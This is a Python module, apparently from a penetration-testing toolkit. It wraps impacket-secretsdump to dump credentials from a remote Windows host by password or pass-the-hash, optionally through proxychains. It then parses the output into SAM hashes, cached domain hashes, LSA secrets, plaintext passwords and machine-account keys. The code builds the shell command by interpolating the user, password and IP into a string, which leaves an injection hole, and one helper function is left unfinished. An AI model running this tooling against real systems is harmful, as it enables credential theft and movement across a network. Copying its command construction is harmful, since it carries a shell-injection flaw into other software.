#!/usr/bin/env python3
from ipaddress import IPv4Address
import logging
import re
from pathlib import Path
import typing as T

from . import shell
from .toolz import *
from . import logging
from . import ntlm

log = logging.new_log(__name__)

@curry
def secretsdump(ip: T.Union[str, IPv4Address], user: str, hashes=None, 
                password=None, domain=None, *, 
                proxychains: bool = False,
                secretsdump_exec='impacket-secretsdump',
                getoutput=shell.getoutput, **secretsdump_options):

    options = pipe(
        secretsdump_options,
        keymap(replace('_', '-')),
        keymap(lambda k: f'-{k}'),
        valmap(lambda v: '' if v is True else to_str(v)),
        items,
        map(' '.join),
        ' '.join,
    )

    user = (
        f'{domain}/{user}' if domain else user
    )

    command = (
        ('proxychains ' if proxychains else '') + 
        (f"{secretsdump_exec} -hashes {hashes} {options} '{user}@{ip}'"
         if hashes else
         f"{secretsdump_exec} {options} '{user}':'{password}'@'{ip}'")
    )

    log.info(f'secretsdump command: {command}')

    return getoutput(command)
    
sam_start_re = re.compile(
    r'\[\*\] Dumping local SAM hashes \(uid:rid:lmhash:nthash\)'
)

cached_start_re = re.compile(
    r'\[\*\] Dumping cached domain logon information \(domain/username:hash\)'
)

lsa_start_re = re.compile(
    r'\[\*\] Dumping LSA Secrets'
)

domain_start_re = re.compile(
    r'\[\*\] Dumping Domain Credentials \(domain\\uid:rid:lmhash:nthash\)'
)

end_re = re.compile(
    r'\[\*\] Cleaning up\.\.\.'
)

@curry
def split_by_regex(regexes: T.Tuple[str|re.Pattern], content: str):
    regexes = pipe(
        regexes, 
        map(to_regex), 
        tuple,
    )

def dump_parts(content: str):
    class matches:
        sam = sam_start_re.search(content)
        cached = cached_start_re.search(content)
        lsa = lsa_start_re.search(content)
        domain = domain_start_re.search(content)
        end = end_re.search(content)

    parts = {
        'sam': '',
        'cached': '',
        'lsa': '',
        'domain': '',
    }
    if matches.sam and matches.cached:
        parts['sam'] = content[
            matches.sam.end(): matches.cached.start()
        ].strip()

    if matches.cached and matches.lsa:
        parts['cached'] = content[
            matches.cached.end(): matches.lsa.start()
        ].strip()

    if matches.lsa and matches.domain:
        parts['lsa'] = content[
            matches.lsa.end(): matches.domain.start()
        ].strip()
    elif matches.lsa and matches.end:
        parts['lsa'] = content[
            matches.lsa.end(): matches.end.start()
        ].strip()

    if matches.domain and matches.end:
        parts['domain'] = content[
            matches.domain.end(): matches.end.start()
        ].strip()

    return parts

secret_header_re = re.compile(
    r'\[\*\]\s+(?P<name>\S+)'
)
def get_secrets(content: str):
    return pipe(
        secret_header_re.split(content)[1:],
        partition(2),
        dict,
        valmap(strip()),
    )


account_re = re.compile(
    r'(?:(?P<slash_domain>\S+?)[\\/])?'
    r'(?P<user>[A-Za-z0-9\.\_\- \(\)]+)'
    r'(?:@(?P<at_domain>\S+))?'
)

def parse_account(content: str):
    if ':' in content:
        content = content.split(':')[0]
    account:dict = groupdict(account_re, content)
    fus = account['user']
    fubs = account['user']
    sd, ad = account.pop('slash_domain'), account.pop('at_domain')
    account['domain'] = sd or ad
    if account['domain']:
        fus = account["domain"] + "/" + fus
        fubs = account["domain"] + "\\" + fubs
    return merge(
        account, {
            'full_user_slash': fus,
            'full_user_bslash': fubs,
        }
    )

password_re = re.compile(
    r'(?:(?P<slash_domain>\S+?)[\\/])?'
    r'(?P<user>[A-Za-z0-9\.\_\- \(\)]+)'
    r'(?:@(?P<at_domain>\S+))?'
    r'(?::(?P<pw>.*))'
)
def is_password(content: str):
    return (
        len(content.splitlines()) == 1 and password_re.search(content)
    )

def parse_password(content: str):
    pw_dict = pipe(
        groupdict(password_re, content), 
        cdissoc('slash_domain'),
        cdissoc('at_domain'),
    )
    print(pw_dict)
    print(content)
    return merge(
        parse_account(content), pw_dict, 
    )

class NtlmCreds(T.TypedDict):
    domain: str | None
    user: str
    sid: str
    lm: str
    nt: str

class Dcc2Hash(T.TypedDict):
    domain: str
    user: str
    dcc2: str

class Account(T.TypedDict):
    user: str
    domain: str
    full_user_slash: str
    full_user_bslash: str
    pw: str

class DomainAccounts(T.TypedDict):
    users: T.Sequence[NtlmCreds]
    machines: T.Sequence[NtlmCreds]

class MachineInfo(T.TypedDict):
    account: Account
    plain_password_hex: str
    ntlm: str
    nt: str

class SecretsDump(T.TypedDict):
    ip: str
    local: T.Sequence[NtlmCreds]
    domain: DomainAccounts
    machine: MachineInfo
    dcc2: T.Sequence[Dcc2Hash]
    secrets: T.Dict[str, str]
    passwords: T.Sequence[Account]

def parse_sam_content(content: str) -> SecretsDump:
    return {
        'local': pipe(
            content,
            finditerd(ntlm.ntlm_all_re),
            tuple,
        ),
    }

@ensure_paths
def parse_sam_file(path: Path) -> SecretsDump:
    return pipe(
        path, 
        slurp,
        parse_sam_content,
        cmerge({
            'ip': ntlm.get_ip(path),
        }),
    )

@ensure_paths
def parse_txt_file(path: Path) -> SecretsDump:
    content = to_str(path.read_bytes())
    parts = dump_parts(content)

    secrets = get_secrets(parts['lsa'])
    pw_secrets = pipe(
        secrets,
        valfilter(is_password),
        valmap(parse_password),
    )

    local_users = pipe(
        parts['sam'],
        finditerd(ntlm.ntlm_all_re),
        tuple,
    )

    domain_accounts = pipe(
        parts['domain'],
        finditerd(ntlm.ntlm_all_re),
    )
    domain_users = pipe(
        domain_accounts,
        filter(lambda d: not d['user'].endswith('$')),
        tuple,
    )
    domain_machines = pipe(
        domain_accounts,
        filter(lambda d: d['user'].endswith('$')),
        tuple,
    )

    machine = {}
    machine_str = secrets.get('$MACHINE.ACC', '')

    def add_account(account: str, machine=machine):
        account = parse_account(account)
        if 'account' in machine:
            if machine['account'] != account:
                log.error(
                    f'Got a different account in the $MACHINE.ACC '
                    f'secret: {account}'
                )
        else:
            machine['account'] = account

    if machine_str:
        for line in machine_str.splitlines():
            match line.split(':'):
                case [account, lm, nt, '', '', '']:
                    add_account(account)
                    machine['ntlm'] = f'{lm}:{nt}'
                    machine['nt'] = nt
                case [account, key, value]:
                    add_account(account)
                    machine[key] = value

    dcc2 = pipe(
        parts['cached'],
        finditerd(ntlm.dcc2_re),
        tuple,
    )

    return {
        'ip': ntlm.get_ip(path),
        'local': local_users,
        'domain': {
            'users': domain_users,
            'machines': domain_machines,
        },
        'machine': machine,
        'dcc2': dcc2,
        'secrets': secrets,
        'passwords': pw_secrets,
    }

@ensure_paths
def parse_dump(path: Path) -> SecretsDump:
    match path:
        case Path(suffix='.txt'):
            return parse_txt_file(path)
        case Path(suffix='.sam'):
            return parse_sam_file(path)

